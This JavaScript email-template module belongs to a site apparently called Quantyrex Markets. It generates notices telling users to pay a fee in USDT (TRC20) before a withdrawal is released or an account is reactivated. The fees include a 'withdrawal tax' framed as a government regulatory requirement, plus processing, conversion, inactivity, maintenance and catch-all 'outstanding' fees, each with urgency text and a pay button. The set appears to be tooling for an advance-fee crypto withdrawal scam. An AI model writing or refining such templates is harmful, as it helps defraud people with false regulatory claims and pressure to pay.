const baseProTemplate = require('./base-pro');
const { formatUSD } = require('./_money');

const FRONTEND_URL = process.env.FRONTEND_URL || 'https://quantyrexmarkets.vercel.app';

const FEE_CONTENT = {
  processing: {
    badge: 'TRANSACTION NOTICE',
    title: 'Transaction Verification Required',
    subtitle: 'To complete your withdrawal request, a verification and network processing charge is required for transaction authorization and compliance checks.',
    txType: 'Withdrawal',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Processing Fee',
    covers: [
      { icon: '🛡️', label: 'Transaction Validation & Verification' },
      { icon: '🔗', label: 'Secure Network Transfer Authorization' },
      { icon: '🔒', label: 'Anti-Fraud Security Screening' },
      { icon: '💲', label: 'Network Costs & Processing Services' }
    ],
    urgency: 'Please complete the fee payment to continue processing your transaction.',
    btnLabel: 'COMPLETE VERIFICATION'
  },
  tax: {
    badge: 'TAX NOTICE',
    title: 'Withdrawal Tax Fee Required',
    subtitle: 'In accordance with current financial regulations, a withdrawal tax must be settled before your transaction can be released. This is a regulatory compliance requirement.',
    txType: 'Tax Settlement',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Withdrawal Tax Fee',
    covers: [
      { icon: '📋', label: 'Regulatory Compliance Filing' },
      { icon: '🛡️', label: 'Government-Mandated Reporting' },
      { icon: '🔒', label: 'Audit Trail Documentation' },
      { icon: '💲', label: 'Withdrawal Release Authorization' }
    ],
    urgency: 'Please complete the tax payment to release your withdrawal.',
    btnLabel: 'SETTLE TAX FEE'
  },
  conversion: {
    badge: 'CONVERSION NOTICE',
    title: 'Currency Conversion Fee Required',
    subtitle: 'A currency conversion fee applies to your transaction. This covers real-time exchange rate processing and multi-currency settlement services.',
    txType: 'Currency Conversion',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Currency Conversion Fee',
    covers: [
      { icon: '🔄', label: 'Real-Time Exchange Rate Processing' },
      { icon: '🔗', label: 'Multi-Currency Conversion Engine' },
      { icon: '💲', label: 'Settlement Authorization' },
      { icon: '🛡️', label: 'Conversion Verification' }
    ],
    urgency: 'Please complete the fee payment to finalize your currency conversion.',
    btnLabel: 'COMPLETE CONVERSION'
  },
  inactivity: {
    badge: 'REACTIVATION NOTICE',
    title: 'Account Reactivation Required',
    subtitle: 'Your account has been inactive for an extended period. An inactivity fee is required to reactivate your account and restore full trading privileges.',
    txType: 'Account Reactivation',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Account Inactivity Fee',
    covers: [
      { icon: '🛡️', label: 'Full Trading Access Restoration' },
      { icon: '💲', label: 'Withdrawal & Deposit Re-enablement' },
      { icon: '🔗', label: 'Bots & Copy Trading Activation' },
      { icon: '🔒', label: 'Account Security Refresh' }
    ],
    urgency: 'Welcome back. Please complete the fee payment to reactivate your account.',
    btnLabel: 'REACTIVATE ACCOUNT'
  },
  maintenance: {
    badge: 'MAINTENANCE NOTICE',
    title: 'Account Maintenance Fee Required',
    subtitle: 'A routine maintenance fee is required to keep your account operational. This covers infrastructure, security, and 24/7 platform monitoring.',
    txType: 'Account Maintenance',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Account Maintenance Fee',
    covers: [
      { icon: '🔗', label: 'Server Infrastructure & Uptime' },
      { icon: '🔒', label: '24/7 Security Monitoring' },
      { icon: '🛡️', label: 'Continuous Platform Updates' },
      { icon: '💲', label: 'Account Services Continuity' }
    ],
    urgency: 'Please complete the fee payment to maintain account services.',
    btnLabel: 'SETTLE MAINTENANCE FEE'
  },
  custom: {
    badge: 'TRANSACTION NOTICE',
    title: 'Outstanding Fee Notice',
    subtitle: 'An outstanding fee has been applied to your account that requires immediate attention. Please review the details below and complete the payment.',
    txType: 'Fee Settlement',
    network: 'USDT (TRC20)',
    feeTypeLabel: 'Outstanding Fee',
    covers: [
      { icon: '🛡️', label: 'Transaction Authorization' },
      { icon: '🔗', label: 'Account Service Continuity' },
      { icon: '💲', label: 'Payment Processing' },
      { icon: '🔒', label: 'Settlement Verification' }
    ],
    urgency: 'Please complete the fee payment to continue using your account.',
    btnLabel: 'COMPLETE PAYMENT'
  }
};

// Capitalize words for friendly display
const friendlyLabel = (label, fallback) => {
  if (!label) return fallback;
  const rawTypes = ['processing', 'tax', 'conversion', 'inactivity', 'maintenance', 'custom'];
  if (rawTypes.includes(label.toLowerCase())) return fallback;
  return label.replace(/\b\w/g, c => c.toUpperCase());
};

// Build a detail row: emoji + label + value (stacks on mobile)
const detailItem = (emoji, label, value) => `
  <td valign="top" width="50%" style="padding:14px 10px;vertical-align:top;">
    <table cellpadding="0" cellspacing="0" border="0" width="100%">
      <tr>
        <td valign="middle" width="44" style="padding-right:10px;">
          <div style="width:40px;height:40px;background:#dbeafe;border-radius:50%;text-align:center;line-height:40px;font-size:20px;">${emoji}</div>
        </td>
        <td valign="middle">
          <p style="margin:0;color:#64748b;font-size:9px;font-weight:700;letter-spacing:1.2px;">${label}</p>
          <p style="margin:3px 0 0;color:#0f172a;font-size:13px;font-weight:600;line-height:1.3;">${value}</p>
        </td>
      </tr>
    </table>
  </td>
`;

const feeRequiredEmail = (name, feeLabel, feeAmount, currency, feeType, userId) => {
  const fee = FEE_CONTENT[feeType] || FEE_CONTENT.custom;
  const clientId = userId ? `#QXM-${String(userId).slice(-5).toUpperCase()}` : `#QXM-${Math.floor(Math.random() * 90000 + 10000)}`;
  const now = new Date();
  const dateStr = now.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }) + ' • ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true }) + ' UTC';
  const displayFeeLabel = friendlyLabel(feeLabel, fee.feeTypeLabel);

  return baseProTemplate(`
    <!-- Badge -->
    <p style="margin:0 0 14px;color:#2563eb;font-size:11px;font-weight:700;letter-spacing:2.5px;">${fee.badge}</p>

    <!-- Title -->
    <h1 style="margin:0 0 12px;color:#0f172a;font-size:24px;font-weight:700;line-height:1.25;letter-spacing:-0.3px;">${fee.title}</h1>

    <!-- Blue underline -->
    <div style="width:42px;height:3px;background:#2563eb;border-radius:2px;margin:0 0 18px;font-size:0;line-height:0;">&nbsp;</div>

    <!-- Subtitle -->
    <p style="margin:0 0 26px;color:#64748b;font-size:13px;line-height:1.7;">${fee.subtitle}</p>

    <!-- Details Card - 2x2 grid -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 16px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;">
      <tr>
        ${detailItem('👤', 'CLIENT ID', clientId)}
        ${detailItem('📄', 'TRANSACTION TYPE', fee.txType)}
      </tr>
      <tr><td colspan="2" style="border-top:1px solid #e2e8f0;height:1px;font-size:0;line-height:0;">&nbsp;</td></tr>
      <tr>
        ${detailItem('💲', 'NETWORK', fee.network)}
        ${detailItem('📅', 'DATE & TIME', dateStr)}
      </tr>
    </table>

    <!-- Amount Due Block - dark navy -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 16px;background:#0f1e3f;border-radius:10px;">
      <tr>
        <td style="padding:22px 24px;">
          <table width="100%" cellpadding="0" cellspacing="0" border="0">
            <tr>
              <td valign="middle" width="58%" style="border-right:1px solid #1e3a8a;padding-right:14px;">
                <p style="margin:0 0 8px;color:#94a3b8;font-size:10px;font-weight:600;letter-spacing:1.5px;">AMOUNT DUE</p>
                <p style="margin:0;color:#ffffff;font-size:26px;font-weight:700;line-height:1;letter-spacing:-0.5px;">${formatUSD(feeAmount)}</p>
              </td>
              <td valign="middle" width="42%" style="padding-left:14px;">
                <p style="margin:0 0 8px;color:#94a3b8;font-size:10px;font-weight:600;letter-spacing:1.5px;">FEE TYPE</p>
                <p style="margin:0;color:#60a5fa;font-size:14px;font-weight:600;line-height:1.3;">${displayFeeLabel}</p>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>

    <!-- What This Fee Covers - 2x2 grid (better for mobile) -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 18px;background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;">
      <tr>
        <td style="padding:20px 18px;">
          <p style="margin:0 0 18px;color:#2563eb;font-size:10px;font-weight:700;letter-spacing:2px;">WHAT THIS FEE COVERS</p>
          <table width="100%" cellpadding="0" cellspacing="0" border="0">
            <tr>
              <td width="50%" valign="top" style="padding:8px;vertical-align:top;">
                <table cellpadding="0" cellspacing="0" border="0">
                  <tr>
                    <td valign="middle" width="38" style="padding-right:10px;">
                      <div style="width:36px;height:36px;background:#dbeafe;border-radius:50%;text-align:center;line-height:36px;font-size:18px;">${fee.covers[0].icon}</div>
                    </td>
                    <td valign="middle"><p style="margin:0;color:#334155;font-size:11px;font-weight:500;line-height:1.4;">${fee.covers[0].label}</p></td>
                  </tr>
                </table>
              </td>
              <td width="50%" valign="top" style="padding:8px;vertical-align:top;">
                <table cellpadding="0" cellspacing="0" border="0">
                  <tr>
                    <td valign="middle" width="38" style="padding-right:10px;">
                      <div style="width:36px;height:36px;background:#dbeafe;border-radius:50%;text-align:center;line-height:36px;font-size:18px;">${fee.covers[1].icon}</div>
                    </td>
                    <td valign="middle"><p style="margin:0;color:#334155;font-size:11px;font-weight:500;line-height:1.4;">${fee.covers[1].label}</p></td>
                  </tr>
                </table>
              </td>
            </tr>
            <tr>
              <td width="50%" valign="top" style="padding:8px;vertical-align:top;">
                <table cellpadding="0" cellspacing="0" border="0">
                  <tr>
                    <td valign="middle" width="38" style="padding-right:10px;">
                      <div style="width:36px;height:36px;background:#dbeafe;border-radius:50%;text-align:center;line-height:36px;font-size:18px;">${fee.covers[2].icon}</div>
                    </td>
                    <td valign="middle"><p style="margin:0;color:#334155;font-size:11px;font-weight:500;line-height:1.4;">${fee.covers[2].label}</p></td>
                  </tr>
                </table>
              </td>
              <td width="50%" valign="top" style="padding:8px;vertical-align:top;">
                <table cellpadding="0" cellspacing="0" border="0">
                  <tr>
                    <td valign="middle" width="38" style="padding-right:10px;">
                      <div style="width:36px;height:36px;background:#dbeafe;border-radius:50%;text-align:center;line-height:36px;font-size:18px;">${fee.covers[3].icon}</div>
                    </td>
                    <td valign="middle"><p style="margin:0;color:#334155;font-size:11px;font-weight:500;line-height:1.4;">${fee.covers[3].label}</p></td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </td>
      </tr>
    </table>

    <!-- Urgency Notice (stacked) -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0 0 14px;background:#eff6ff;border:1px solid #dbeafe;border-radius:10px;">
      <tr>
        <td style="padding:16px 18px;">
          <table cellpadding="0" cellspacing="0" border="0">
            <tr>
              <td valign="middle" style="padding-right:10px;">
                <div style="width:24px;height:24px;background:#2563eb;border-radius:50%;text-align:center;line-height:24px;color:#ffffff;font-size:14px;font-weight:700;">!</div>
              </td>
              <td valign="middle" style="color:#1e293b;font-size:13px;line-height:1.5;font-weight:500;">${fee.urgency}</td>
            </tr>
          </table>
        </td>
      </tr>
    </table>

    <!-- CTA Button (full-width on mobile) -->
    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="margin:0;">
      <tr>
        <td align="center">
          <a href="${FRONTEND_URL}/dashboard" style="display:block;background:#2563eb;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:1.2px;padding:16px 24px;border-radius:8px;text-decoration:none;text-transform:uppercase;text-align:center;">${fee.btnLabel} &nbsp;→</a>
        </td>
      </tr>
    </table>
  `);
};

module.exports = feeRequiredEmail;
